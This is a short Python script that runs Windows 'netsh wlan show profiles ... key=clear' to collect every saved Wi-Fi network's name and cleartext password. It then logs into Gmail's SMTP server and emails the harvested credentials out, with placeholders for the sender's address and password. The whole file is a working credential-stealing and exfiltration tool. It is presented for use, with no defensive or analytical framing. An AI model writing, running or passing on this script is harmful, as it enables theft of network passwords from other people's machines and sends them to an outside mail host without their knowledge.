import subprocess
import re
import smtplib

data = ''
command = "netsh wlan show profiles"
networks = subprocess.check_output(command, shell=True)
network_name = re.findall(rb"(?:Profile\s*:\s)(.*)", networks)

for i in network_name:
    network = i.decode('utf-8')
    command = 'netsh wlan show profiles name=' + \
        '"{}"'.format(network.split('\r')[0]) + ' key=clear'
    result = subprocess.check_output(command, shell=True)
    data += result.decode('utf-8')

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()

# change "your_email_address" to your real email address
#  "your_password" to email password

server.login('your_email_address', 'your_password')
server.sendmail("your_email_address",
                "your_email_address", data)

# exit the smtp server!
server.quit()
